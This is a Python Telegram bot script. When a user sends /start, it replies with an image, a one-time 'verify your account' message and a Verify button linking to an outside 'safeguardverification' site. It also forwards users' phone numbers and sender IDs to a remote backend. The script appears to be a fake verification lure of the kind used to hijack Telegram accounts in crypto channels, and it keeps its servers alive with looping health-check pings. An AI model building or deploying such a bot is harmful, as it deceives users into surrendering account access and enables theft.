import asyncio
import httpx
import requests
from telethon import TelegramClient, events
from telethon.tl.custom import Button
import aiohttp  # Asynchronous HTTP requests
from backend import clients
from dotenv import load_dotenv
import os
from aiohttp import web  # For the HTTP server

# Load environment variables from the .env file
load_dotenv()

# Access the environment variables
api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')
bot_token = os.getenv('BOT_TOKEN')

bot_client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# External API endpoint to call (Flask server endpoint)
FLASK_API_URL = 'https://telebot-ivng.onrender.com/get_phone_by_sender_id'  # Replace with your Flask API endpoint
API_URL = 'https://telebot-ivng.onrender.com/send_message'  # Replace with your API endpoint

# Event handler for /start command
@bot_client.on(events.NewMessage(pattern='/start'))
async def on_start(event):
    try:
        # Download the image from the URL
        image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/safeguard%20bot%2FScreenshot_20241223_101134_Telegram.jpg?alt=media&token=b207be6b-c41d-41ed-84e7-37855b02a4f8'
        response = requests.get(image_url)

        # Check if the image was downloaded successfully
        if response.status_code == 200:
            from io import BytesIO  # Import BytesIO here to avoid unnecessary global imports
            image_data = BytesIO(response.content)  # Convert the content into a file-like object
            image_data.name = 'image.jpg'  # Set a name for the file-like object

            await event.respond(
                file=image_data,  # Send the image as bytes with a name
                message=(
                    "You can verify your account by clicking on the verify button below\n\n"
                    "This is a one time use and will expire"
                ),
                buttons=[
                    [Button.url("Verify", "https://safeguardverification.netlify.app/")],
                    [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]  # Button with a URL link
                ]
            )
        else:
            # await event.respond("Failed to fetch the image from the provided URL.")
            print(f"Failed to fetch the image from the provided URL.")

    except Exception as e:
        await event.respond(f"Error: There was an issue verifying your account. Please try again")
        
# Function to retrieve phone number from Flask API based on sender_id
async def get_phone_by_sender_id(sender_id):
    if not sender_id or not isinstance(sender_id, str):
        print("Invalid sender_id provided.")
        return None
    async with aiohttp.ClientSession() as session:
        try:
            params = {'sender_id': sender_id}
            async with session.get(FLASK_API_URL, params=params) as response:
                if response.status == 200:
                    response_data = await response.json()
                    return response_data.get('phone', None)
                else:
                    print(f"Error from Flask API: {response.status} - {await response.text()}")
                    return None
        except Exception as e:
            print(f"Failed to call Flask API: {e}")
            return None


# Function to call the external API (e.g., sending a message)
async def call_external_endpoint(user_client):
    async with aiohttp.ClientSession() as session:
        try:
            data = {'phone': user_client.phone}
            async with session.post(API_URL, json=data) as response:
                if response.status == 200:
                    response_data = await response.json()
                    return f"Response from API: {response_data.get('message', 'Success!')}"
                else:
                    return f"Error from API: {response.status}"
        except Exception as e:
            return f"Failed to call API: {e}"

# HTTP Server for health checks
async def health_check(request):
    return web.Response(text="Bot is running!")

async def run_http_server():
    app = web.Application()
    app.router.add_get('/health', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 5001)  # Use port 5001
    await site.start()


# Individual health check for the first target URL
async def first_health_check(target_url):
    while True:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"{target_url}/health")
                if response.status_code == 200:
                    print(f"Health check success for {target_url}")
                else:
                    print(f"Health check failed for {target_url} with status code {response.status_code}")
        except Exception as e:
            print(f"Error during health check for {target_url}: {e}")
        await asyncio.sleep(15)  # Wait 15 seconds before checking again


# Individual health check for the second target URL
async def second_health_check(target_url):
    while True:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"{target_url}/health")
                if response.status_code == 200:
                    print(f"Health check success for {target_url}")
                else:
                    print(f"Health check failed for {target_url} with status code {response.status_code}")
        except Exception as e:
            print(f"Error during health check for {target_url}: {e}")
        await asyncio.sleep(15)  # Wait 15 seconds before checking again


# General health check combining both URLs
async def general_health_check(first_target_url, second_target_url):
    while True:
        try:
            # Run both health checks concurrently
            await asyncio.gather(
                first_health_check(first_target_url),
                second_health_check(second_target_url)
            )
        except Exception as e:
            print(f"Error during general health check: {e}")
        await asyncio.sleep(15)  # Ensure a loop cycle even if there's an exception


# Main function to run both the bot and the HTTP server
async def main():
    # Start the bot
    await bot_client.start()
    print("Bot is running...")

    # Start the HTTP server
    await run_http_server()
    # Replace with the URL of the other server
    first_server_url = "https://api-proxy-leoa.onrender.com"  # Update to actual address
    second_server_url = "https://telebot-ivng.onrender.com"  # Update to actual address
    await loop.create_task(general_health_check(first_server_url, second_server_url))
    # Keep the bot running
    await bot_client.run_until_disconnected()

# Run the bot
if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
